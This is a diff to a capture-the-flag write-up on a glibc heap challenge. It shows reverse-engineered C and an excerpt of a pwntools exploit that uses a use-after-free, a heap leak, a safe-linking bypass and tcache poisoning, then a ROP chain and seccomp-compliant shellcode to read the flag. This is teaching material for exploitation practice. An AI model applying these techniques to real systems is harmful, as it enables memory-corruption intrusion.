@@ -10,7 +10,7 @@ Safe-linking uses ASLR of the heap's address to XOR the tcache forward pointers.
 
 ### Reverse Engineering
 ##### The Structs
-```C
+```c
 struct string{
     int size;
     int index;
@@ -27,7 +27,7 @@ struct card{
 
 ##### Main
 It's a pretty typical menu, but there is a hidden option. This buffer is obviously supposed to be used for ROP / shellcode.
-```C
+```c
 case 6uLL:
 printf("Enter your secret name: ", a2);
 a2 = (char **)&buf;
@@ -36,7 +36,7 @@ break;
 ```
 
 ##### Init Function
-```C
+```c
 unsigned __int64 init_buf_alarm_seccomp(){
   setvbuf(stdin, 0LL, 2, 0LL);
   setvbuf(stdout, 0LL, 2, 0LL);
@@ -45,7 +45,7 @@ unsigned __int64 init_buf_alarm_seccomp(){
 }
 ``` 
 
-```C
+```c
 unsigned __int64 seccomp(){
   if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )
   {
@@ -92,7 +92,7 @@ ruby ~/.gem/ruby/2.7.0/bin/seccomp-tools dump ./cards
 
 ##### Add Card
 What's important here is that the card name is not null terminated. We could use this to leak things.
-```C
+```c
 unsigned __int64 add_card()
 {
   int v0; // ebx
@@ -127,7 +127,7 @@ unsigned __int64 add_card()
 
 ##### Edit Card
 Here we've got a UAF. The function does not check if a card has been freed.
-```C
+```c
 unsigned __int64 edit_name(){
   unsigned int v1; // [rsp+4h] [rbp-Ch]
   
@@ -151,8 +151,8 @@ Nothing here, the function does proper checks. It just outputs the fields of a c
 
 
 ## Exploit
-For the full file, see exploit.py
-```Python
+Here is the exploit logic and comments. For the full file, see exploit.py
+```python
 #####################################
 # LEAK THE HEAP'S BASE ADDRESS!
 #####################################
@@ -169,7 +169,6 @@ rm_card(a)
 # Therefore, adding another card, our name string will take the 3rd element in the bin, the card struct.
 # The card struct's 3rd member is a pointer to its string struct and it is still there in memory.
 # We can leak it thanks to the fact that no null terminator is appended to our name string.
-flag_str = '/home/valvey/flag\x00'
 b = add_card(0x28, 'red', 'b'*0x10)
 view_card(b)
 p.recvuntil('Card name: ')
@@ -184,6 +183,9 @@ log.info(f'Heap: {hex(heap_base)}')
 # We need the heap address to be able to encrypt and decrypt the FD pointers of free tcache bins.
 # Let's take control of tcache_perthread_struct by allocating a chunk on it.
 # We cannot use 0x28 size for this or the program's mallocs will break everything.
+def protect_ptr(heap_addr, ptr):
+    return (heap_addr >> 12) ^ ptr
+
 tcache_fd = protect_ptr(heap_base, heap_base+0x10)
 c = add_card(0xf8, 'red', 'a')
 d = add_card(0xf8, 'red', 'ddddddd') # need to add 2 to put idx count to 2 or our added pointer wont be used
@@ -236,7 +238,7 @@ rop.call(heap_base+0x390)
 log.info(f'ROP: \n{rop.dump()}')
 
 # The shellcode. Because of seccomp, we have to use open, read and write syscalls.
-edit_name(b, '/home/challenge/flag\x00')
+edit_name(b, flag_path)
 flag_str_addr = heap_base + 0x2a0
 shellcode = shellcraft.linux.syscall('SYS_open', flag_str_addr, 'O_RDONLY', 0)
 shellcode += shellcraft.linux.syscall('SYS_read', 'rax', heap_base, 32)
